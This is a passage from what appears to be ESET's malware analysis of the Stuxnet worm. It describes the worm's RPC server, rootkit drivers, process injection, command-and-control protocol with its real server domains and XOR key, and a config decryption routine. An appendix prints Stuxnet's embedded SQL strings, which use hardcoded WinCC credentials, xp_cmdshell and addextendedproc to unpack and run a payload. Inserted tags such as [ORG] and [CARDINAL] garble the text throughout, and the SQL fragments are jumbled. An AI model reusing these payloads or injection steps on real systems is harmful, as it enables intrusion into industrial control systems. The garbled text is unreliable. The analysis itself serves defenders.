user - mode components to shutdown so as to remove them properly ; [ORG] Stops and deletes the [ORG] MrxCls service ( kernel - mode driver ) ; [ORG] Stops and deletes the MrxNet service ( kernel - mode driver ) ; [GPE] Deletes oem7A.PNF ( the main module ) ; [GPE] Deletes mrxcls.sys ( kernel - mode injector ) ; [GPE] Deletes mrxnet.sys ( kernel - mode hider ) ; [GPE] Deletes mdmeric3.pnf ; [GPE] Deletes [PERSON] mdmcpq3.pnf ( Stuxnet 's configuration file ) ; [GPE] Deletes oem6C.PNF ( file with tracing / debugging information).Export [CARDINAL] 19This function drops the following files , used to propagate through [ORG] USB flash drives , into a specified location that it receives as a parameter : Copy of [PERSON] Shortcut [PERSON] to.lnk ; Copy of Copy of Shortcut to.lnk ; Copy of Copy of Copy of Shortcut to.lnk ; Copy of Copy of Copy of Copy of Shortcut to.lnk ; ~WTR4141.TMP ; ~WTR4132.TMP.Export [CARDINAL] 22This function is responsible for distributing of Stuxnet through the network by using vulnerabilities described in the section on Distribution ( MS08 - 67 and MS10 - 061 ) . Also this function performs communication ( sending and receiving updates ) with instances of the worm on the other machines by [ORG] RPC mechanism.www.eset.comExport [CARDINAL] 2455This function performs modifications of [ORG] the [ORG] Bot [ORG] Configuration [ORG] Data . Export 27This function implements a component of Stuxnet 's [ORG] RPC [ORG] Server responsible for handling remote calls . Export [CARDINAL] 28This function exchanges information with the [ORG] C&C server . It creates and sends the message to the [ORG] C&C server as described in the section Remote Communication Protocol . When the message is ready it scans processes in the system to find iexplore.exe . If this exists then it injects the main module into it and calls export function [CARDINAL] 29 , passing the message as a parameter . This function is responsible for performing actual data exchange with the [ORG] C&C server . In the event that there is no iexplore.exe in the system , it calls this function from the address space of the default browser : it starts the default browser as a new process , injects into it the main module , and calls the function performing data exchange . Export [CARDINAL] 29Figure [CARDINAL] 4.8 \u2013 [WORK_OF_ART] The [WORK_OF_ART] Scheme [WORK_OF_ART] for [WORK_OF_ART] Sending DataThis function performs exchange of data with the [ORG] C&C server . It receives the message to be sent as input . Much of its functionality is described in the section on the \u201c Remote communication protocol . \u201d Its purpose is to send data to the remote server and to receive a reply as a binary module that will be subsequently executed.www.eset.comExport [CARDINAL] 3156This function performs the same actions as function number [CARDINAL] 9 . To build the dropper it can use either of the following sets of files : Or%Dir%\\GracS\\cc_alg.sav ; [GPE] % Dir%\\GracS\\\\db_log.sav ; % Dir%\\GracS\\\\cc_tag.sav.%Dir%\\XUTILS\\listen\\XR000000.MDX ; % Dir%\\XUTILS\\links\\S7P00001.DBF ; % Dir%\\XUTILS\\listen\\S7000001.MDX.Which set to use is specified as a parameter as well as % Dir%.Export [CARDINAL] 32This function is called from the services.exe process : otherwise , it wo n't be executed . This function starts the [ORG] RPC server to handle [ORG] RPC calls made by Stuxnet 's user - mode components and creates a window that drops malicious files onto removable drives . It registers a window class with the name \" AFX64c313 \" and creates a window corresponding to the class created . The window procedure of the class monitors WM_DEVICE_CHANGE messages sent when there is a change to the hardware configuration of a device or the computer . The window procedure of the class handles only requests with [ORG] wParam set to [PRODUCT] DBT_DEVICEARRIVAL . These are sent when a device or removable media have been inserted and have become accessible ( for instance , when a [ORG] USB flash drive has been connected to the computer ) . When this happens , depending on parameters of the configuration data , it can either drop malicious files on the drive , or remove them from there . Moreover , configuration data also specify the minimum number of files that the removable drive should contain in order to perform infection.4.1.7 [ORG] RPC [ORG] ServerStuxnet implements an [ORG] RPC server to communicate with other instances of the worm over the network . It uses the [ORG] RPC mechanism to receive updates not only from the remote [ORG] C&C server but from other instances of the worm running on the infected machines in the network . This feature adds flexibility as it is able to stay updated even without direct connection with [ORG] C&C server . It requests the version of the worm installed on the remote machine , and if the remote machine is running a more recent version , the newer version is requested and installed on the requester machine . The following figure illustrates the architecture of the server : www.eset.com57Figure [CARDINAL] 4.9 \u2013 Architecture of Stuxnet 's [ORG] RPC [ORG] ServerIt consists of the [CARDINAL] two components : The [ORDINAL] first component is responsible for handling [ORG] RPC calls from the local host , i.e. from modules injected into process within the local system . It is executed within the address space of the services.exe process ; The [ORDINAL] second component of the server performs handling [ORG] RPC calls from remote hosts . This component is executed within the address space of the process hosting [CARDINAL] one of the following services : netsvc , rpcss , browser . Both components implement the same functions . The [ORDINAL] first [CARDINAL] five function as outlined on the figure above are executed by local component only : when these functions are executed they determine which component calls them , and if it is the component responsible for handling remote calls , they make a call to the local component and exit . This is indicated in the figure with arrows . Stuxnet 's [ORG] RPC [ORG] Server implements the following procedures : RpcProc1 \u2013 Returns the version of the worm ; RpcProc2 \u2013 Loads a module passed as a parameter into a new process and executesspecified exported function ; executing this function and calls its exported function number 1;RpcProc3 \u2013 Loads a module passed as a parameter into the address of the processRpcProc4 \u2013 Loads a module passed as a parameter into a new process and executes it ; RpcProc5 \u2013 Builds the worm dropper ; RpcProc6 \u2013 Runs the specified application ; RpcProc7 \u2013 Reads data from the specified file ; RpcProc8 \u2013 Writes data into the specified file ; RpcProc9 \u2013 Deletes the specified file ; RpcProc10 \u2013 Works with the files of which the names are intercepted by hooks set up infunction number [CARDINAL] 2 and writes information in tracing file.www.eset.com4.1.8 Resources58Here we will describe the resources of the main module . According to X the module has [CARDINAL] 13 resources . processesinto certainA proxy dynamic link libraryA .cab file with dynamic link library insideConfiguration data for [LOC] MrxCls.sysA dynamic link library \u2013 fake s7otbldx.dll ( [ORG] Siemens [ORG] SCADA module)Encrypted data file drop to % WINDIR%\\help\\winmic.ftsTemplate PE - file , used to construct dropper ( ~WTR4132.TMP)Module used for distribution of the worm by exploiting [ORG] RPC vulnerabilityModule used for distribution of the worm by exploiting MS10 - 061 vulnerability . LNK file template , used to create .LNK files exploiting vulnerability ~ WTR4141.TMP \u2013 dynamic link library , used to load dropper ( ~WTR4132.TMP ) while infecting systemKernel - mode driver ( MrxNet.sys ) responsible for concealing files exploiting [ORG] LNK vulnerability and infecting systemModule used to escalate privileges by exploiting [DATE] 0 - [DATE] day vulnerability in Win32k.sys4.2 Kernel - mode functionalityThe worm has some rootkit functionality , as during infection of the system it drops and installs [CARDINAL] two kernel - mode drivers that allow it to hide files and inject code into process in the system : [ORG] MrxCls.sys ; MrxNet.sys . These modules are not packed or protected with any packer or protector . Moreover these drivers are digitally signed . Here are the digital certificates of the public keys corresponding to the private keys used to sign the drivers ( we received samples signed with [CARDINAL] two different private keys).www.eset.com59Figure [CARDINAL] 4.10 \u2013 [ORG] Digital certificates Used to Verify Driver 's SignaturesAfter it was ascertained that the certificates were compromised , both were revoked by Verisign . Variant registered in OS as a boot start service . Thus it is loaded as early as possible in the OS boot process . Some of its data are encrypted with a custom encryption algorithm . If we decrypt them , we get the following string constants with the following meanings : Table 4.2.1 \u2013 Decrypted String Constants Found in the DriverREGISTRY\\MACHINE\\SYSTEM\\CurentControlSet\\Services\\MrxClsData\\Device\\MrxClsDvxName of the registry key thatcorresponds to the driverName of the value of the registrykey related to the driverName of the device object that iscreated by the driverTo be able to inject code it registers a special routine that is called each time a module is loaded in are stored in driver 's registry key with the value name presented in [LAW] Table [LAW] 4.2.1 . The data can also be stored in a file on disk : if the driver failed for some reason to read the configuration data from registry , it reads it from the file , if any exists . Here is configuration data found on an infected machine : Figure [CARDINAL] 4.12 \u2013 The configuration data of the driverAs we can see from the figure , these data specify what modules should be injected by the driver into the address spaces of certain processes . For instance , here we see that in processes in which executableswww.eset.com61have the names services.exe , S7tgtopx.exe and CCProjectMgr.exe , the driver injects a module stored in a file with the name \\SystemRoot\\inf\\oem7A.PNF . The configuration data also specify the name or ordinal number of the export of the injected module to be called . For instance in this case , when oem7A.PNF will be loaded into the address spaces of the CCProjectMgr.exe or S7togtopx.exe , the exported function number [CARDINAL] 2 should be called . In the case of services.exe the exported function with the ordinal 1 should be called . If a process is debugged the driver does n't perform an injection , and it determines whether the process is debugged by reading [ORG] BeingDebugged field of the PEB structure of a process but is also able to stealthily call an exported function from the already injected modules . The injection of a module is performed in [CARDINAL] three stages : Allocating memory in the address space of the target process and copying module andInitializing supplemental data and code with import from kernel32.dll library , and1 . supplemental code into the newly allocated buffer ; [CARDINAL] 2 . overwriting the [ORDINAL] first bytes of the entry point of the process image ; [CARDINAL] 3 . Mapping the module to inject into the address space of the process , initializing import address table , fixing relocations , calling its entry point and restoring the original bytes of the image entry point . Figure [CARDINAL] 4.13 \u2013 Injecting a Module into Process Address SpaceStage 1When the process image is loaded into the address space of the process , the notification routine is called and the driver determines whether the process is debugged . If it is n\u2019t , it looks in its configuration data to get the name of the module to inject . Once it obtains the name of the module it allocates [CARDINAL] two buffers in the process , [CARDINAL] one for the module and another for supplemental code . Then it sets memorywww.eset.com62protection of the entry point region to PAGE_EXECUTE_WRITECOPY , a value which makes it writable . In the following figure we can see a layout of the modules in the user - mode address space of the process : Figure [CARDINAL] 4.14 \u2013 Layout of Modules and Buffers in [ORG] User - Mode [ORG] Address [ORG] Space of a Process Prior to Loading kernel32.dll LibraryStage 2At the [ORDINAL] second stage , when the driver receives notification that kernel32.dll has been mapped into the address space of the process , it initializes import of the supplemental code from the loaded library and overwrites the [ORDINAL] first [CARDINAL] seven bytes of the entry point of the process image with the following commands : Figure [CARDINAL] 4.15 \u2013 Patched entry pointAPIs exported by [ORG] kernel32.dll and used by supplemental code are : [PRODUCT] VirtualAlloc , [PERSON] VirtualFree , GetProcAddress , GetModuleHandle , LoadLibraryA , LoadLibraryW , lstrcmpi , GetVersionEx , [ORG] DeviceIoControl . The layout of the modules at this stage is presented on the following figure : lstrcmp , Figure [CARDINAL] 4.16 \u2013 Layout of Modules and Buffers in [ORG] User - Mode [ORG] Address [ORG] Space of a Process after Loading kernel32.dllwww.eset.comStage 363At this stage , when the entry point of the application receives control it transfers to the entry point of the supplemental code , the purpose of which is to map the module and call its entry point . When the work is finished it restores the original entry point and sets the memory protection value of the entry point region to its initial value . Then it transfers control to the original entry point . Figure [CARDINAL] 4.17 \u2013 Layout of Modules and Buffers in [ORG] User - Mode [ORG] Address [ORG] Space of a Process after Application 's Entry Point is CalledDeviceIoControlThe driver creates a device object with the name specified in [LAW] Table [LAW] 4.2.1 and registers handlers for the following requests : IRP_MJ_CREATE ; IRP_MJ_CLOSE ; IRP_MJ_DEVICE_CONTROL.The [ORDINAL] first [CARDINAL] two handlers do nothing but successfully complete [ORG] IRP packet , while the [ORDINAL] third handler is used to dispatch control requests from an application . When the created device object receives an IRP_MJ_DEVICE_CONTROL request with [ORG] IOCTL equal to [CARDINAL] 0x223800 it changes memory protection of the region specified in the request parameters : www.eset.comstruct IOCTL_PARAMS{64DWORD Signature;// Signature always set to [CARDINAL] 0xAFABF00DDWORD Reserved1;HANDLE hProcess;// Handle of the processDWORD Reserved2;void * BaseAddress;// Base address of memory [GPE] regionDWORD Reserved3;DWORD RegionSize;// [PERSON] Size of the memory [ORG] regionDWORD [ORG] Reserved4;DWORD [ORG] NewProtection;// [ORG] New protection memory constantDWORD Reserved5;};When supplemental code changes memory protection of the entry point it initializes this structure and passes it as a parameter to [ORG] DeviceIoControl API.4.2.2 MRXNET.sysThe purpose of this driver is to hide files that are used to propagate the malware through [ORG] USB drives . It acts as a file system driver filter . In the very beginning of its initialization it registers the [ORG] FileSystemRegistrationChange routine enables it to attach to file systems available in the system , but it is interested only in ntfs , fat and cdfs file systems . When a new file system is mounted the driver receives a notification , creates a device object and attaches it to the top of the device stack . From then on the driver is able to monitor all the requests that are addressed to the file system . It waits for an IRP_MJ_MOUNT_VOLUME request to arrive and attaches itself to the mounted volume to intercept requests related to operations with files and directories . It creates [ORG] DeviceObjects and attaches it to those device objects created by and corresponding to the specified file system drivers . The driver hooks IRP_MJ_DIRECTORY_CONTROL requests addressed to the file systems it is attached to , enabling it to filter results from querying information about files and subdirectories . This request is used to get information related to the directory , and in particular what files are located in the directory . It hides the same files as ~WTR4141.tmp does : files with \" .LNK \" extension with a file length of [DATE] 1471 ( 0x104b ) bytes ; files with \" .TMP \" extension where the name consists of [CARDINAL] 12 characters ( including extension ) in the following format : \" ~WTRabcd . [ORG] TMP \" , where a , b , c , d are digits from [CARDINAL] 0 [CARDINAL] to [CARDINAL] 9 which sum modulo [CARDINAL] 10 equals [CARDINAL] 0 ( \" ~WTR4411.TMP \" for example).On receiving an IRP_MJ_DIRECTORY_CONTROL request it sets an [ORG] IO completion routine that filters results of the request . Depending on the control operation that is requested , the driver goes through the corresponding structure and deletes all entries matching the search criteria.www.eset.comStuxnet Bot Configuration Data4.365Stuxnet stores its encrypted configuration data ( [DATE] 1860 bytes ) in % WINDIR%\\inf\\mdmcpq3.pnf . A decryption algorithm is presented in [PERSON] Appendix [PERSON] A. These data contain information about : URLs of [ORG] C&C servers ( see figure below ) ; Activation time \u2013 the time and date after which the worm is active ; Deactivation time \u2013 the time after which the worm becomes inactive and deletes itself ; Version of the malware ; The minimum quantity of files that the removable drive should contain to drop malicious . LNK files successfully;Other information about its propagation and functioning . Figure [CARDINAL] 4.18 \u2013 An Extract from [ORG] the [ORG] Configuration [ORG] Datawww.eset.com4.4 [ORG] Remote [ORG] Communication [ORG] Protocol66The malware communicates to the [ORG] C&C server through http . A list of URLs is included in the Stuxnet configuration data of Stuxnet : www.windowsupdate.com ; www.msn.com ; www.mypremierfutbol.com ; www.todaysfutbol.comThe [ORDINAL] first [CARDINAL] two URLs are used to check that the system has connection to the Internet , while the [ORDINAL] third and the [ORDINAL] fourth are URLs of [ORG] C&C servers . If it fails to successfully establish connection with the remote host ( www.windowsupdate.com ) it stops sending data to the [ORG] C&C server . When the malware confirms that the infected computer is connected to the Internet it sends an http request to the remote server . Here is an example of the URL with data : http:// www.mypremierfutbol.com/index.php?data=data_to_send,where data_to_send is encrypted and encoded message . It uses a custom encryption algorithm with a key length equal [CARDINAL] 31 bytes:// Encryptionchar Key[31 ] = { 0x67 , [CARDINAL] 0xA9 , [ORG] 0x6E , 0x28 , [DATE] 0x90 , [DATE] 0x0D , 0x58 , [DATE] 0xD6,0xA4 , 0x5D , [DATE] 0xE2 , 0x72 , [GPE] 0x66 , [GPE] 0xC0 , [DATE] 0x4A , 0x57,0x88 , 0x5A , [GPE] 0xB0 , [DATE] 0x5C , [DATE] 0x6E , [CARDINAL] 0x45 , 0x56 , 0x1A,0xBD , [GPE] 0x7C , [DATE] 0x71 , 0x5E , [DATE] 0x42 , [DATE] 0xE4 , [ORG] 0xC1};// [ORG] Encryption procedurevoid EncryptData(char * Buffer , int [PERSON] BufferSize , char * Key){}for ( int i = [CARDINAL] 0 ; i < [PERSON] BufferSize ; i + + ) [ORG] Buffer[i ] ^= [PERCENT] Key[i [PERCENT] % 31];return;The encrypted data are represented as a string of [GPE] Unicode characters : each byte of the binary data is presented as [CARDINAL] 2 characters . For instance , 0x7A96E2890 will be written as \" 7A96E2890 \" [PERSON] Unicode string . The data to be sent have the following structure : www.eset.com67Figure [CARDINAL] 4.19 \u2013 The Structure of the Data Sent to [ORG] C&C [ORG] ServerThe [ORDINAL] first byte of the data is a hexadecimal constant 0x01 , followed by [CARDINAL] 16 bytes of the malware configuration data . The [ORG] IP address of the host is the [ORDINAL] first non - loopback entry in the list of [ORG] IPv4 addresses of the host sorted in the ascending order . While preparing the data to be sent the malware gathers information about all the network adapters installed on the system by calling the GetAdaptersInfo API . This includes : The adapter name ; The adapter description ; The hardware address of the adapter ; The list of [ORG] IPv4 addresses associated with the adapter ; The [ORG] IPv4 address of the gateway for the adapter ; The [ORG] IPv4 address of the [ORG] DHCP server for the adapter ; The [ORG] IPv4 address of the primary WINS server ; The [ORG] IPv4 address of the [ORDINAL] secondary WINS server;The message field can be described with the following structure : struct [PERSON] STUXNET_CC_MESSAGE{BYTE [PERSON] Constant;BYTE [PERSON] ConfigByte;BYTE OsVerMajor;BYTE OsVerMinor;// Set to 0x01// A BYTE of the configuration data// The major version number of the OS// The minor version number of the [ORG] OSBYTE OsVerServicePackMajor;// The major version number of the service pack // installed on the [ORG] systemBYTE Reserved[3];DWORD ConfigDword;WORD CurrentACP;WORD OsVerSuitMask;BYTE Flags;// padding// A DWORD of the configuration data// Current [ORG] ANSI code page identifier for the // system// A bitmask identifying the product suites // available on the system// See reference bellowwww.eset.comchar [PRODUCT] ComputerName[];// [PRODUCT] NetBIOS name of the local computer68char DomainName[];char ConfigDataStr[];// Name of the domain or workgroup the computer // is joined to if any// A string from configuration dataFigure [CARDINAL] 4.20 \u2013 Description of the Flags Field in STUXNET_CC_MESSAGE Structure};We can see that flags corresponding to the [ORDINAL] first and the last bits in the byte are unused . Flags 1,4,5,6 are related to the configuration data of the malware . Flag 2 signifies whether Stuxnet is active . Flag 3 is set in case Stuxnet detects [ORG] Siemens software installed on the infected machine , which it does by searching in the registry the following keys and values : Key \u2013 HKLM\\SOFTWARE\\SIEMENS\\STEP7 , value \u2013 STEP7_Version ; Key \u2013 HKLM\\SOFTWARE\\SIEMENS\\WinCC\\Setup , value \u2013 Version . When the message is constructed , the malware encrypts it by XORing each byte with the hexadecimal constant [DATE] 0xFF . The malware receives a response from the [ORG] C&C server which is structured as follows : Figure [CARDINAL] 4.21 \u2013 The Structure of the [ORG] Response from the [ORG] C&C ServerThe [ORDINAL] first [CARDINAL] four bytes of the response store the size of the image in the received data : if image size plus 5 bytes is n't equal to the size of the received data , then Stuxnet stops parsing the response . On receiving the response the malware loads the image and call its export with ordinal number [CARDINAL] 1 . The [ORDINAL] fifth byte of the response specifies exactly how it should be executed . If this byte is set to 0x01 , then an [ORG] RPC function will be called and as a result the received image will be executed at the address of the process hosting Stuxnet 's [ORG] RPC server . If the [ORDINAL] fifth byte is [CARDINAL] zero , then the image will be loaded into the address space of this process and an export function numbered as [CARDINAL] 1 will be executed . The following figure clarifies this mechanism : www.eset.com69Figure [CARDINAL] 4.22 \u2013 [ORG] Dispatching [ORG] Received Datawww.eset.comConclusion70We conducted a detailed technical analysis of the worm Win32 / Stuxnet , which currently is perhaps the most technologically sophisticated malicious program developed for a targeted attack to date . We have not released extensive information here about injecting code into the [NORP] SCADA system , as it deserves an independent discussion ( and indeed , has been discussed at length by Langner ) . This research was intended primarily as material for specialists in information security , showing how technology can be made use of in targeted attacks . Thanks to everyone who finished reading our report until [ORG] the [ORG] end!www.eset.comAppendix [ORG] A71Further Coverage and Resources , in approximately chronological order : url url url url url url url url url url url url url url url url url url url url url url ~ E8A0D43832567452FBDEE07AF579E893C ~ ATpl ~ Ecommon ~ Scontent.html url Say / Article/201011415827544?lpos = [PERSON] World_News_News_Your_Way_Region_5&lid = [ORG] NewsYour Way_ARTICLE_15827544_Stuxnet_Worm%3A_Virus_Targeted_At_Irans_Nuclear_Plant_Is_In_H ands_Of_Bad_Guys%2C_Sky_News_Sources_Sayurl url url url url url#40280338 url url url url with - new - worm - stuxnet - hype/10150130942127788 - black - market-1142866.htmlurl url url url url#more-2513 url url url previously stated in [LAW] Section [LAW] 2 of this document , as of version [CARDINAL] 1.31 of this document , we will not be publishing further revisions except to correct errors or to introduce substantial new or modified material . We will , however , be adding links from time to time to the ESET blog entry at url B74Decryption algorithm for PNF file with configuration data \" \" \" //key = [CARDINAL] 71 //counter = byte number from begin file mov eax , Key imul eax , _ [ORG] Offset mov ecx , eax shr ecx , 0Bh xor ecx , eax imul ecx , 4E35h movzx edx , cx movzx ecx , dx imul ecx , ecx mov eax , ecx shr ecx , [ORDINAL] 0Dh shr eax , [DATE] 17h add al , cl mov ecx , edx shr ecx , 8 xor eax , ecx movzx ecx , dl xor eax , ecx movzx ecx , _ [PERSON] Byte xor eax , ecx mov result , al # decrypt function on python def [GPE] decrypt(key , counter , sym ): v0 = key * counter v1 = v0 > > 0xb v1 = ( v1 ^ v0 ) * 0x4e35 v2 = v1 & 0xffff v3 = v2 * v2 v4 = v3 > > 0xd v5 = v3 > > 0x17 xorbyte=((v5 & 0xff ) + ( v4 & 0xff ) ) & 0xff xorbyte = xorbyte ^ ( ( v2 > > 8) & 0xff ) xorbyte = xorbyte ^ ( v2 & 0xff ) return xorbyte [PRODUCT] ^ [PRODUCT] symwww.eset.com75Appendix CSQL query strings embedded in [GPE] Stuxnetset @t = [GPE] right(@t , len(@t ) - 7)if exists ( select text from dbo.syscomments set @t = ' alter ' + @t + begin endexec ( @t)@t varchar(4000 ) , @e int , @f intset @t = [ORG] left(@t , @e - 1 ) set @t = [GPE] right(@t , len(@t ) - 7)where o.id = c.id and c.id = object_id(N'[dbo].[MCPVREADVARPERCON]')set @f = charindex('sp_msforeachdb ' , @t ) if @f = 0 elsewhere i d = object_id(N'[dbo].[MCPVREADVARPERCON ] ' ) ) select @t = rtrim(text ) from dbo.syscomments c , dbo.sysobjects o set @e = charindex(',openrowset ' , @t ) if @e = 0 ' , openrowset(''SQLOLEDB'',''Server=.\\WinCC;uid = [ORG] WinCCConnect;pwd=2WSXcder'',''select [ORG] 0;set [ORG] IMPLICIT_TRANSACTIONS [ORG] off;declare [ORG] @z nvarchar(999);set @z = '' ' ' use [ ? ] ; declare @t nvarchar(2000);declare @s [ORG] nvarchar(9);set @s = '' ' ' ' ' ' ' --CC - S '' ' ' ' ' ' ' + char(80);if left(db_name ( ) , [CARDINAL] 2 ) = '' ' ' ' ' ' ' CC '' ' ' ' ' ' ' select @t = substring(text , [ORG] charindex(@s , text ) + 8 , charindex(''''''''-- * '' ' ' ' ' ' ' , text ) - charindex(@s , text ) - 8) from syscomments where text like ( '' ' ' ' ' ' ' % '' ' ' ' ' ' ' + @s + '' ' ' ' ' ' ' % '' ' ' ' ' ' ' ) ; if @t is not [ORG] NULL exec(@t)'''';exec sp_msforeachdb @z'')'select * from fail_in_order_to_return_falsewww.eset.com76if exists ( select * from dbo.syscommentsselect @t = rtrim(c.text ) from dbo.syscomments c , dbo.sysobjects owhere o.id = c.id and c.id = object_id(N'[dbo].[MCPVPROJECT2]')where i d = object_id(N'[dbo].[MCPVPROJECT2]'))order by c.number , c.colidset @e = charindex('--CC - SP ' , @t)@t varchar(4000 ) , @e int , @f intString [CARDINAL] 2 -CC - SP use master;declare @t varchar(999),@s varchar(999),@a int declare r cursor for select filename from master sysdatabases where ( name like '' CC% '' ) open r fetch next from r into @t while ( @@fetch_status<>-1 ) begin set @t = [ORG] left(@t , len(@t)-charindex(''\\ '' , reverse(@t ) ) ) + '' \\GraCS\\cc_tlg7.sav'';exec master xp_fileexist @t , @a out;if @a=1 begin set @s = '' master xp_cmdshell '' ' ' extrac32 /y \" '' + @t+ '' \" \" '' + @t+''x\"'''''';exec(@s);set @t = @t+''x'';dbcc [PRODUCT] addextendedproc(sp_payload,@t);exec master [PERSON] sp_payload;exec master sp_dropextendedproc sp_payload;break ; end fetch next from r into @t end close r deallocate r --*'if @e=0 set @t = ' alter ' + @t + ' where ( ( SELECT top [CARDINAL] 1 [CARDINAL] 1 FROM MCPVREADVARPERCON)=''1 '' ) -set @f = charindex('where ' , @t ) if @f < > 0 set @t = [ORG] left(@t , @f - 1 ) set @t = [GPE] right(@t , len(@t ) - 6)select * from fail_in_order_to_return_falsebegin endexec ( @t)www.eset.com77from MCPTPROJECT where ( ( SELECT top [CARDINAL] 1 [CARDINAL] 1 FROM [NORP] MCPVREADVARPERCON)='1')MCPTPROJECT.PROJECTNAME , [PERSON] MCPTPROJECT.PROJECTVERSION , [ORG] MCPTPROJECT.PROJECTMODE , MCPTPROJECT.PROJECTCREATOR , [ORG] MCPTPROJECT.PROJECTEDITOR , MCPTPROJECT.CREATIONDATE , MCPTPROJECT.EDITDATE , MCPTPROJECT.PRJCOMMENT , MCPTPROJECT.CSLANGUAGE , [PERSON] MCPTPROJECT.RTLANGUAGE , [PERSON] MCPTPROJECT.PROJECTGUID , [ORG] MCPTPROJECT.PRJTABLETYPES , [ORG] MCPTPROJECT.PRJDATATYPES , [ORG] MCPTPROJECT.PRJCREATEVERMAJ , [ORG] MCPTPROJECT.PRJCREATEVERMIN , [GPE] MCPTPROJECT.PRJXRES , [ORG] MCPTPROJECT.PRJTIMEMODE , [ORG] MCPTPROJECT.PRJDELTAMODE , [PERSON] MCPTPROJECT.PRJDELTAREMOTE from MCPTPROJECTString 3 view MCPVPROJECT2 as select PROJECTID , PROJECTNAME , [PERSON] PROJECTVERSION , [ORG] PROJECTMODE , [ORG] PROJECTCREATOR , PROJECTEDITOR , CREATIONDATE , EDITDATE , PRJCOMMENT , CSLANGUAGE , [ORG] RTLANGUAGE , [ORG] PROJECTGUID , [ORG] PRJTABLETYPES , [ORG] PRJDATATYPES , [ORG] PRJCREATEVERMAJ , [ORG] PRJCREATEVERMIN , [ORG] PRJXRES , [ORG] PRJTIMEMODE , [ORG] PRJDELTAMODE , [ORG] PRJDELTAREMOTE view MCPVPROJECT2 as select [PERSON] MCPTPROJECT.PROJECTID , view MCPVREADVARPERCON as select VARIABLEID , VARIABLETYPEID , FORMATFITTING , SCALEID , cursor for select filename from master sysdatabases where ( name like '' CC% '' ) open r fetch next from r into @t while ( @@fetch_status<>-1 ) begin set @t = [ORG] left(@t , len(@t)- charindex(''\\'',reverse(@t)))+''\\GraCS\\cc_tlg7.sav'';exec master xp_fileexist @t,@a out;if @a=1 begin set @s = '' master xp_cmdshell '' ' ' extrac32 /y \" '' + @t+ '' \" \" '' + @t+''x\"'''''';exec(@s);set @t=@t+''x'';dbcc addextendedproc(sp_run,@t);exec master sp_run;exec master sp_dropextendedproc sp_run;break;end fetch next from r into @t end close r deallocate r ' ) view MCPVREADVARPERCON as select [ORG] MCPTVARIABLEDESC.VARIABLEID , view MCPVPROJECT2 as select JECTID , PROJECTNAME , [PERSON] PROJECTVERSION , [ORG] PROJECTMODE , [ORG] PROJECTCREATOR , MCPTVARIABLEDESC.VARIABLETYPEID , MCPTVARIABLEDESC.FORMATFITTING , [ORG] MCPTVARIABLEDESC.SCALEID , [PERSON] MCPTVARIABLEDESC.VARIABLENAME , [ORG] CPTVARIABLEDESC.ADDRESSPARAMETER , MCPTVARIABLEDESC.PROTOKOLL , [ORG] MCPTVARIABLEDESC.MAXLIMIT , [ORG] MCPTVARIABLEDESC.MINLIMIT , MCPTVARIABLEDESC.STARTVALUE , MCPTVARIABLEDESC.SUBSTVALUE , [GPE] MCPTVARIABLEDESC.VARFLAGS , [PERSON] MCPTVARIABLEDESC.CONNECTIONID , MCPTVARIABLEDESC.VARPROPERTY , [ORG] MCPTVARIABLEDESC.CYCLETIMEID , [ORG] MCPTVARIABLEDESC.LASTCHANGE , MCPTVARIABLEDESC.ASDATASIZE , [ORG] MCPTVARIABLEDESC.OSDATASIZE , [ORG] MCPTVARIABLEDESC.VARGROUPID , MCPTVARIABLEDESC.VARXRES , [PRODUCT] MCPTVARIABLEDESC.VARMARK , [ORG] MCPTVARIABLEDESC.SCALETYPE , [DATE] MCPTVARIABLEDESC.SCALEPARAM1 , [DATE] MCPTVARIABLEDESC.SCALEPARAM2 , [DATE] MCPTVARIABLEDESC.SCALEPARAM3 , MCPTVARIABLEDESC.SCALEPARAM4 from [ORG] MCPTVARIABLEDESCVARIABLENAME , [ORG] ADDRESSPARAMETER , PROTOKOLL , [ORG] MAXLIMIT , [ORG] MINLIMIT , STARTVALUE , [PERSON] SUBSTVALUE , [GPE] VARFLAGS , [ORG] CONNECTIONID , [ORG] VARPROPERTY , [ORG] CYCLETIMEID , [ORG] LASTCHANGE , [ORG] ASDATASIZE , OSDATASIZE , VARGROUPID , [GPE] VARXRES , [ORG] VARMARK , [ORG] SCALETYPE , [GPE] SCALEPARAM1 , [ORG] SCALEPARAM2 , [ORG] SCALEPARAM3 , SCALEPARAM4 from MCPTVARIABLEDESC , openrowset('SQLOLEDB','Server=.\\WinCC;uid = WinCCConnect;pwd=2WSXcder ' , ' select 0;declare @t varchar(999),@s varchar(999),@a int declare rPROJECTEDITOR , CREATIONDATE , EDITDATE , PRJCOMMENT , CSLANGUAGE , [ORG] RTLANGUAGE , [ORG] PROJECTGUID , [ORG] PRJTABLETYPES , [ORG] PRJDATATYPES , [CARDINAL] www.eset.com78openrowset('SQLOLEDB','Server=.\\WinCC;uid = WinCCConnect;pwd=2WSXcder',VARIABLENAME , [ORG] ADDRESSPARAMETER , PROTOKOLL , [ORG] MAXLIMIT , [ORG] MINLIMIT , STARTVALUE , [PERSON] SUBSTVALUE , [GPE] VARFLAGS , [ORG] CONNECTIONID , [ORG] VARPROPERTY , [ORG] CYCLETIMEID , [ORG] LASTCHANGE , [ORG] ASDATASIZE , OSDATASIZE , VARGROUPID , [GPE] VARXRES , [ORG] VARMARK , [ORG] SCALETYPE , [GPE] SCALEPARAM1 , [ORG] SCALEPARAM2 , [ORG] SCALEPARAM3 , SCALEPARAM4 from [ORG] MCPTVARIABLEDESC,\"'select [ORG] 0;use master;declare @t varchar(999),@s varchar(999);selectPRJCREATEVERMAJ , [ORG] PRJCREATEVERMIN , [ORG] PRJXRES , [ORG] PRJTIMEMODE , [ORG] PRJDELTAMODE , [ORG] PRJDELTAREMOTE from MCPTPROJECT where ( ( SELECT top [CARDINAL] 1 [CARDINAL] 1 FROM [ORG] MCPVREADVARPERCON)='1')MCPTVARIABLEDESC.VARIABLETYPEID , MCPTVARIABLEDESC.FORMATFITTING , [ORG] MCPTVARIABLEDESC.SCALEID , [PERSON] MCPTVARIABLEDESC.VARIABLENAME , [PERSON] MCPTVARIABLEDESC.ADDRESSPARAMETER , [ORG] MCPTVARIABLEDESC.PROTOKOLL , [ORG] MCPTVARIABLEDESC.MAXLIMIT , [ORG] MCPTVARIABLEDESC.MINLIMIT , MCPTVARIABLEDESC.STARTVALUE , MCPTVARIABLEDESC.SUBSTVALUE , [GPE] MCPTVARIABLEDESC.VARFLAGS , [PERSON] MCPTVARIABLEDESC.CONNECTIONID , MCPTVARIABLEDESC.VARPROPERTY , [ORG] MCPTVARIABLEDESC.CYCLETIMEID , [ORG] MCPTVARIABLEDESC.LASTCHANGE , 